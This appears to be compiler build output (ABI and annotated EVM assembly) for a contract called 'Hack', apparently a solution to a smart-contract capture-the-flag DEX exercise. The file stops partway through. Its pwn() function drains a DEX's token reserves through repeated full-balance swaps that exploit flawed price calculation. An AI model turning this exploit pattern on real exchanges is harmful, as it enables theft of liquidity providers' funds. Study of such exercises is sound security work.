{
	"contracts/Dex.sol": {
		"Hack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract IDex",
							"name": "_dex",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "pwn",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/Dex.sol\":924:1945  contract Hack {... */\n  mstore(0x40, 0xe0)\n    /* \"contracts/Dex.sol\":1051:1179  constructor(IDex _dex) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/Dex.sol\":1090:1094  _dex */\n  dup1\n    /* \"contracts/Dex.sol\":1084:1094  dex = _dex */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x80\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  dup2\n  mstore\n  pop\n  pop\n    /* \"contracts/Dex.sol\":1120:1123  dex */\n  mload(0x80)\n    /* \"contracts/Dex.sol\":1120:1130  dex.token1 */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xd21220a7\n    /* \"contracts/Dex.sol\":1120:1132  dex.token1() */\n  mload(0x40)\n  dup2\n  0xffffffff\n  and\n  0xe0\n  shl\n  dup2\n  mstore\n  0x04\n  add\n  0x20\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  dup7\n  gas\n  staticcall\n  iszero\n  dup1\n  iszero\n  tag_7\n  jumpi\n  returndatacopy(0x00, 0x00, returndatasize)\n  revert(0x00, returndatasize)\ntag_7:\n  pop\n  pop\n  pop\n  pop\n  mload(0x40)\n  returndatasize\n  not(0x1f)\n  0x1f\n  dup3\n  add\n  and\n  dup3\n  add\n  dup1\n  0x40\n  mstore\n  pop\n  dup2\n  add\n  swap1\n  tag_8\n  swap2\n  swap1\n  tag_9\n  jump\t// in\ntag_8:\n    /* \"contracts/Dex.sol\":1104:1133  token1 = IERC20(dex.token1()) */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xa0\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  dup2\n  mstore\n  pop\n  pop\n    /* \"contracts/Dex.sol\":1159:1162  dex */\n  mload(0x80)\n    /* \"contracts/Dex.sol\":1159:1169  dex.token2 */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x25be124e\n    /* \"contracts/Dex.sol\":1159:1171  dex.token2() */\n  mload(0x40)\n  dup2\n  0xffffffff\n  and\n  0xe0\n  shl\n  dup2\n  mstore\n  0x04\n  add\n  0x20\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  dup7\n  gas\n  staticcall\n  iszero\n  dup1\n  iszero\n  tag_11\n  jumpi\n  returndatacopy(0x00, 0x00, returndatasize)\n  revert(0x00, returndatasize)\ntag_11:\n  pop\n  pop\n  pop\n  pop\n  mload(0x40)\n  returndatasize\n  not(0x1f)\n  0x1f\n  dup3\n  add\n  and\n  dup3\n  add\n  dup1\n  0x40\n  mstore\n  pop\n  dup2\n  add\n  swap1\n  tag_12\n  swap2\n  swap1\n  tag_9\n  jump\t// in\ntag_12:\n    /* \"contracts/Dex.sol\":1143:1172  token2 = IERC20(dex.token2()) */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xc0\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  dup2\n  mstore\n  pop\n  pop\n    /* \"contracts/Dex.sol\":1051:1179  constructor(IDex _dex) {... */\n  pop\n    /* \"contracts/Dex.sol\":924:1945  contract Hack {... */\n  jump(tag_13)\n    /* \"#utility.yul\":88:205   */\ntag_15:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_17:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_18:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_30\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_17\n  jump\t// in\ntag_30:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:675   */\ntag_19:\n    /* \"#utility.yul\":616:623   */\n  0x00\n    /* \"#utility.yul\":645:669   */\n  tag_32\n    /* \"#utility.yul\":663:668   */\n  dup3\n    /* \"#utility.yul\":645:669   */\n  tag_18\n  jump\t// in\ntag_32:\n    /* \"#utility.yul\":634:669   */\n  swap1\n  pop\n    /* \"#utility.yul\":568:675   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":681:825   */\ntag_20:\n    /* \"#utility.yul\":765:800   */\n  tag_34\n    /* \"#utility.yul\":794:799   */\n  dup2\n    /* \"#utility.yul\":765:800   */\n  tag_19\n  jump\t// in\ntag_34:\n    /* \"#utility.yul\":758:763   */\n  dup2\n    /* \"#utility.yul\":755:801   */\n  eq\n    /* \"#utility.yul\":745:819   */\n  tag_35\n  jumpi\n    /* \"#utility.yul\":815:816   */\n  0x00\n    /* \"#utility.yul\":812:813   */\n  0x00\n    /* \"#utility.yul\":805:817   */\n  revert\n    /* \"#utility.yul\":745:819   */\ntag_35:\n    /* \"#utility.yul\":681:825   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":831:996   */\ntag_21:\n    /* \"#utility.yul\":899:904   */\n  0x00\n    /* \"#utility.yul\":930:936   */\n  dup2\n    /* \"#utility.yul\":924:937   */\n  mload\n    /* \"#utility.yul\":915:937   */\n  swap1\n  pop\n    /* \"#utility.yul\":946:990   */\n  tag_37\n    /* \"#utility.yul\":984:989   */\n  dup2\n    /* \"#utility.yul\":946:990   */\n  tag_20\n  jump\t// in\ntag_37:\n    /* \"#utility.yul\":831:996   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1002:1375   */\ntag_3:\n    /* \"#utility.yul\":1083:1089   */\n  0x00\n    /* \"#utility.yul\":1132:1134   */\n  0x20\n    /* \"#utility.yul\":1120:1129   */\n  dup3\n    /* \"#utility.yul\":1111:1118   */\n  dup5\n    /* \"#utility.yul\":1107:1130   */\n  sub\n    /* \"#utility.yul\":1103:1135   */\n  slt\n    /* \"#utility.yul\":1100:1219   */\n  iszero\n  tag_39\n  jumpi\n    /* \"#utility.yul\":1138:1217   */\n  tag_40\n  tag_15\n  jump\t// in\ntag_40:\n    /* \"#utility.yul\":1100:1219   */\ntag_39:\n    /* \"#utility.yul\":1258:1259   */\n  0x00\n    /* \"#utility.yul\":1283:1358   */\n  tag_41\n    /* \"#utility.yul\":1350:1357   */\n  dup5\n    /* \"#utility.yul\":1341:1347   */\n  dup3\n    /* \"#utility.yul\":1330:1339   */\n  dup6\n    /* \"#utility.yul\":1326:1348   */\n  add\n    /* \"#utility.yul\":1283:1358   */\n  tag_21\n  jump\t// in\ntag_41:\n    /* \"#utility.yul\":1273:1358   */\n  swap2\n  pop\n    /* \"#utility.yul\":1229:1368   */\n  pop\n    /* \"#utility.yul\":1002:1375   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1381:1503   */\ntag_22:\n    /* \"#utility.yul\":1454:1478   */\n  tag_43\n    /* \"#utility.yul\":1472:1477   */\n  dup2\n    /* \"#utility.yul\":1454:1478   */\n  tag_18\n  jump\t// in\ntag_43:\n    /* \"#utility.yul\":1447:1452   */\n  dup2\n    /* \"#utility.yul\":1444:1479   */\n  eq\n    /* \"#utility.yul\":1434:1497   */\n  tag_44\n  jumpi\n    /* \"#utility.yul\":1493:1494   */\n  0x00\n    /* \"#utility.yul\":1490:1491   */\n  0x00\n    /* \"#utility.yul\":1483:1495   */\n  revert\n    /* \"#utility.yul\":1434:1497   */\ntag_44:\n    /* \"#utility.yul\":1381:1503   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1509:1652   */\ntag_23:\n    /* \"#utility.yul\":1566:1571   */\n  0x00\n    /* \"#utility.yul\":1597:1603   */\n  dup2\n    /* \"#utility.yul\":1591:1604   */\n  mload\n    /* \"#utility.yul\":1582:1604   */\n  swap1\n  pop\n    /* \"#utility.yul\":1613:1646   */\n  tag_46\n    /* \"#utility.yul\":1640:1645   */\n  dup2\n    /* \"#utility.yul\":1613:1646   */\n  tag_22\n  jump\t// in\ntag_46:\n    /* \"#utility.yul\":1509:1652   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1658:2009   */\ntag_9:\n    /* \"#utility.yul\":1728:1734   */\n  0x00\n    /* \"#utility.yul\":1777:1779   */\n  0x20\n    /* \"#utility.yul\":1765:1774   */\n  dup3\n    /* \"#utility.yul\":1756:1763   */\n  dup5\n    /* \"#utility.yul\":1752:1775   */\n  sub\n    /* \"#utility.yul\":1748:1780   */\n  slt\n    /* \"#utility.yul\":1745:1864   */\n  iszero\n  tag_48\n  jumpi\n    /* \"#utility.yul\":1783:1862   */\n  tag_49\n  tag_15\n  jump\t// in\ntag_49:\n    /* \"#utility.yul\":1745:1864   */\ntag_48:\n    /* \"#utility.yul\":1903:1904   */\n  0x00\n    /* \"#utility.yul\":1928:1992   */\n  tag_50\n    /* \"#utility.yul\":1984:1991   */\n  dup5\n    /* \"#utility.yul\":1975:1981   */\n  dup3\n    /* \"#utility.yul\":1964:1973   */\n  dup6\n    /* \"#utility.yul\":1960:1982   */\n  add\n    /* \"#utility.yul\":1928:1992   */\n  tag_23\n  jump\t// in\ntag_50:\n    /* \"#utility.yul\":1918:1992   */\n  swap2\n  pop\n    /* \"#utility.yul\":1874:2002   */\n  pop\n    /* \"#utility.yul\":1658:2009   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/Dex.sol\":924:1945  contract Hack {... */\ntag_13:\n  mload(0x80)\n  mload(0xa0)\n  mload(0xc0)\n  codecopy(0x00, dataOffset(sub_0), dataSize(sub_0))\n  0x00\n  assignImmutable(\"0xaf057546d61dd28804ca035e688a36db5f311bb8c4c9d2e1e5e44c0555cfe3bf\")\n  0x00\n  assignImmutable(\"0x5ad0f966e4dd8863f27c0e6ee7d684c0c8f4319efed210fe15662a0d29bcd615\")\n  0x00\n  assignImmutable(\"0xcc193713febc75d3d9bd2f9ce113f403ff19633f15c8cdbcf79756ae23e77f9a\")\n  return(0x00, dataSize(sub_0))\nstop\n\nsub_0: assembly {\n        /* \"contracts/Dex.sol\":924:1945  contract Hack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xdd365b8b\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"contracts/Dex.sol\":1185:1732  function pwn() external {... */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      stop\n    tag_5:\n        /* \"contracts/Dex.sol\":1219:1225  token1 */\n      immutable(\"0x5ad0f966e4dd8863f27c0e6ee7d684c0c8f4319efed210fe15662a0d29bcd615\")\n        /* \"contracts/Dex.sol\":1219:1238  token1.transferFrom */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x23b872dd\n        /* \"contracts/Dex.sol\":1239:1249  msg.sender */\n      caller\n        /* \"contracts/Dex.sol\":1259:1263  this */\n      address\n        /* \"contracts/Dex.sol\":1266:1268  10 */\n      0x0a\n        /* \"contracts/Dex.sol\":1219:1269  token1.transferFrom(msg.sender, address(this), 10) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_7\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_10\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_10:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n      pop\n        /* \"contracts/Dex.sol\":1279:1285  token2 */\n      immutable(\"0xaf057546d61dd28804ca035e688a36db5f311bb8c4c9d2e1e5e44c0555cfe3bf\")\n        /* \"contracts/Dex.sol\":1279:1298  token2.transferFrom */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x23b872dd\n        /* \"contracts/Dex.sol\":1299:1309  msg.sender */\n      caller\n        /* \"contracts/Dex.sol\":1319:1323  this */\n      address\n        /* \"contracts/Dex.sol\":1326:1328  10 */\n      0x0a\n        /* \"contracts/Dex.sol\":1279:1329  token2.transferFrom(msg.sender, address(this), 10) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_13\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_13:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_15\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_15:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_16\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_16:\n      pop\n        /* \"contracts/Dex.sol\":1340:1346  token1 */\n      immutable(\"0x5ad0f966e4dd8863f27c0e6ee7d684c0c8f4319efed210fe15662a0d29bcd615\")\n        /* \"contracts/Dex.sol\":1340:1354  token1.approve */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x095ea7b3\n        /* \"contracts/Dex.sol\":1363:1366  dex */\n      immutable(\"0xcc193713febc75d3d9bd2f9ce113f403ff19633f15c8cdbcf79756ae23e77f9a\")\n        /* \"contracts/Dex.sol\":1369:1383  type(uint).max */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"contracts/Dex.sol\":1340:1384  token1.approve(address(dex), type(uint).max) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_17\n      swap3\n      swap2\n      swap1\n      tag_18\n      jump\t// in\n    tag_17:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_20\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_20:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_21\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_21:\n      pop\n        /* \"contracts/Dex.sol\":1394:1400  token2 */\n      immutable(\"0xaf057546d61dd28804ca035e688a36db5f311bb8c4c9d2e1e5e44c0555cfe3bf\")\n        /* \"contracts/Dex.sol\":1394:1408  token2.approve */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x095ea7b3\n        /* \"contracts/Dex.sol\":1417:1420  dex */\n      immutable(\"0xcc193713febc75d3d9bd2f9ce113f403ff19633f15c8cdbcf79756ae23e77f9a\")\n        /* \"contracts/Dex.sol\":1423:1437  type(uint).max */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"contracts/Dex.sol\":1394:1438  token2.approve(address(dex), type(uint).max) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_22\n      swap3\n      swap2\n      swap1\n      tag_18\n      jump\t// in\n    tag_22:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_24\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_24:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_25\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_25:\n      pop\n        /* \"contracts/Dex.sol\":1449:1470  _swap(token1, token2) */\n      tag_26\n        /* \"contracts/Dex.sol\":1455:1461  token1 */\n      immutable(\"0x5ad0f966e4dd8863f27c0e6ee7d684c0c8f4319efed210fe15662a0d29bcd615\")\n        /* \"contracts/Dex.sol\":1463:1469  token2 */\n      immutable(\"0xaf057546d61dd28804ca035e688a36db5f311bb8c4c9d2e1e5e44c0555cfe3bf\")\n        /* \"contracts/Dex.sol\":1449:1454  _swap */\n      tag_27\n        /* \"contracts/Dex.sol\":1449:1470  _swap(token1, token2) */\n      jump\t// in\n    tag_26:\n        /* \"contracts/Dex.sol\":1480:1501  _swap(token2, token1) */\n      tag_28\n        /* \"contracts/Dex.sol\":1486:1492  token2 */\n      immutable(\"0xaf057546d61dd28804ca035e688a36db5f311bb8c4c9d2e1e5e44c0555cfe3bf\")\n        /* \"contracts/Dex.sol\":1494:1500  token1 */\n      immutable(\"0x5ad0f966e4dd8863f27c0e6ee7d684c0c8f4319efed210fe15662a0d29bcd615\")\n        /* \"contracts/Dex.sol\":1480:1485  _swap */\n      tag_27\n        /* \"contracts/Dex.sol\":1480:1501  _swap(token2, token1) */\n      jump\t// in\n    tag_28:\n        /* \"contracts/Dex.sol\":1511:1532  _swap(token1, token2) */\n      tag_29\n        /* \"contracts/Dex.sol\":1517:1523  token1 */\n      immutable(\"0x5ad0f966e4dd8863f27c0e6ee7d684c0c8f4319efed210fe15662a0d29bcd615\")\n        /* \"contracts/Dex.sol\":1525:1531  token2 */\n      immutable(\"0xaf057546d61dd28804ca035e688a36db5f311bb8c4c9d2e1e5e44c0555cfe3bf\")\n        /* \"contracts/Dex.sol\":1511:1516  _swap */\n      tag_27\n        /* \"contracts/Dex.sol\":1511:1532  _swap(token1, token2) */\n      jump\t// in\n    tag_29:\n        /* \"contracts/Dex.sol\":1542:1563  _swap(token2, token1) */\n      tag_30\n        /* \"contracts/Dex.sol\":1548:1554  token2 */\n      immutable(\"0xaf057546d61dd28804ca035e688a36db5f311bb8c4c9d2e1e5e44c0555cfe3bf\")\n        /* \"contracts/Dex.sol\":1556:1562  token1 */\n      immutable(\"0x5ad0f966e4dd8863f27c0e6ee7d684c0c8f4319efed210fe15662a0d29bcd615\")\n        /* \"contracts/Dex.sol\":1542:1547  _swap */\n      tag_27\n        /* \"contracts/Dex.sol\":1542:1563  _swap(token2, token1) */\n      jump\t// in\n    tag_30:\n        /* \"contracts/Dex.sol\":1573:1594  _swap(token1, token2) */\n      tag_31\n        /* \"contracts/Dex.sol\":1579:1585  token1 */\n      immutable(\"0x5ad0f966e4dd8863f27c0e6ee7d684c0c8f4319efed210fe15662a0d29bcd615\")\n        /* \"contracts/Dex.sol\":1587:1593  token2 */\n      immutable(\"0xaf057546d61dd28804ca035e688a36db5f311bb8c4c9d2e1e5e44c0555cfe3bf\")\n        /* \"contracts/Dex.sol\":1573:1578  _swap */\n      tag_27\n        /* \"contracts/Dex.sol\":1573:1594  _swap(token1, token2) */\n      jump\t// in\n    tag_31:\n        /* \"contracts/Dex.sol\":1605:1608  dex */\n      immutable(\"0xcc193713febc75d3d9bd2f9ce113f403ff19633f15c8cdbcf79756ae23e77f9a\")\n        /* \"contracts/Dex.sol\":1605:1613  dex.swap */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xdf791e50\n        /* \"contracts/Dex.sol\":1622:1628  token2 */\n      immutable(\"0xaf057546d61dd28804ca035e688a36db5f311bb8c4c9d2e1e5e44c0555cfe3bf\")\n        /* \"contracts/Dex.sol\":1639:1645  token1 */\n      immutable(\"0x5ad0f966e4dd8863f27c0e6ee7d684c0c8f4319efed210fe15662a0d29bcd615\")\n        /* \"contracts/Dex.sol\":1648:1650  45 */\n      0x2d\n        /* \"contracts/Dex.sol\":1605:1651  dex.swap(address(token2), address(token1), 45) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_32\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_33\n      jump\t// in\n    tag_32:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_34\n      jumpi\n      revert(0x00, 0x00)\n    tag_34:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_36\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_36:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Dex.sol\":1703:1704  0 */\n      0x00\n        /* \"contracts/Dex.sol\":1669:1675  token1 */\n      immutable(\"0x5ad0f966e4dd8863f27c0e6ee7d684c0c8f4319efed210fe15662a0d29bcd615\")\n        /* \"contracts/Dex.sol\":1669:1685  token1.balanceOf */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x70a08231\n        /* \"contracts/Dex.sol\":1694:1697  dex */\n      immutable(\"0xcc193713febc75d3d9bd2f9ce113f403ff19633f15c8cdbcf79756ae23e77f9a\")\n        /* \"contracts/Dex.sol\":1669:1699  token1.balanceOf(address(dex)) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_37\n      swap2\n      swap1\n      tag_38\n      jump\t// in\n    tag_37:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_40\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_40:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_41\n      swap2\n      swap1\n      tag_42\n      jump\t// in\n    tag_41:\n        /* \"contracts/Dex.sol\":1669:1704  token1.balanceOf(address(dex)) == 0 */\n      eq\n        /* \"contracts/Dex.sol\":1661:1725  require(token1.balanceOf(address(dex)) == 0, \"dex balance != 0\") */\n      tag_43\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_44\n      swap1\n      tag_45\n      jump\t// in\n    tag_44:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_43:\n        /* \"contracts/Dex.sol\":1185:1732  function pwn() external {... */\n      jump\t// out\n        /* \"contracts/Dex.sol\":1738:1937  function _swap(IERC20 tokenIn, IERC20 tokenOut) private {... */\n    tag_27:\n        /* \"contracts/Dex.sol\":1804:1807  dex */\n      immutable(\"0xcc193713febc75d3d9bd2f9ce113f403ff19633f15c8cdbcf79756ae23e77f9a\")\n        /* \"contracts/Dex.sol\":1804:1812  dex.swap */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xdf791e50\n        /* \"contracts/Dex.sol\":1834:1841  tokenIn */\n      dup4\n        /* \"contracts/Dex.sol\":1865:1873  tokenOut */\n      dup4\n        /* \"contracts/Dex.sol\":1888:1895  tokenIn */\n      dup6\n        /* \"contracts/Dex.sol\":1888:1905  tokenIn.balanceOf */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x70a08231\n        /* \"contracts/Dex.sol\":1914:1918  this */\n      address\n        /* \"contracts/Dex.sol\":1888:1920  tokenIn.balanceOf(address(this)) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_47\n      swap2\n      swap1\n      tag_38\n      jump\t// in\n    tag_47:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_49\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_49:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_50\n      swap2\n      swap1\n      tag_42\n      jump\t// in\n    tag_50:\n        /* \"contracts/Dex.sol\":1804:1930  dex.swap(... */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_51\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_52\n      jump\t// in\n    tag_51:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_53\n      jumpi\n      revert(0x00, 0x00)\n    tag_53:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_55\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_55:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Dex.sol\":1738:1937  function _swap(IERC20 tokenIn, IERC20 tokenOut) private {... */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_56:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:235   */\n    tag_57:\n        /* \"#utility.yul\":176:183   */\n      0x00\n        /* \"#utility.yul\":205:229   */\n      tag_82\n        /* \"#utility.yul\":223:228   */\n      dup3\n        /* \"#utility.yul\":205:229   */\n      tag_56\n      jump\t// in\n    tag_82:\n        /* \"#utility.yul\":194:229   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:235   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":241:359   */\n    tag_58:\n        /* \"#utility.yul\":328:352   */\n      tag_84\n        /* \"#utility.yul\":346:351   */\n      dup2\n        /* \"#utility.yul\":328:352   */\n      tag_57\n      jump\t// in\n    tag_84:\n        /* \"#utility.yul\":323:326   */\n      dup3\n        /* \"#utility.yul\":316:353   */\n      mstore\n        /* \"#utility.yul\":241:359   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":365:451   */\n    tag_59:\n        /* \"#utility.yul\":411:418   */\n      0x00\n        /* \"#utility.yul\":440:445   */\n      dup2\n        /* \"#utility.yul\":429:445   */\n      swap1\n      pop\n        /* \"#utility.yul\":365:451   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":457:534   */\n    tag_60:\n        /* \"#utility.yul\":494:501   */\n      0x00\n        /* \"#utility.yul\":523:528   */\n      dup2\n        /* \"#utility.yul\":512:528   */\n      swap1\n      pop\n        /* \"#utility.yul\":457:534   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":540:600   */\n    tag_61:\n        /* \"#utility.yul\":568:571   */\n      0x00\n        /* \"#utility.yul\":589:594   */\n      dup2\n        /* \"#utility.yul\":582:594   */\n      swap1\n      pop\n        /* \"#utility.yul\":540:600   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":606:766   */\n    tag_62:\n        /* \"#utility.yul\":665:674   */\n      0x00\n        /* \"#utility.yul\":698:760   */\n      tag_89\n        /* \"#utility.yul\":716:759   */\n      tag_90\n        /* \"#utility.yul\":725:758   */\n      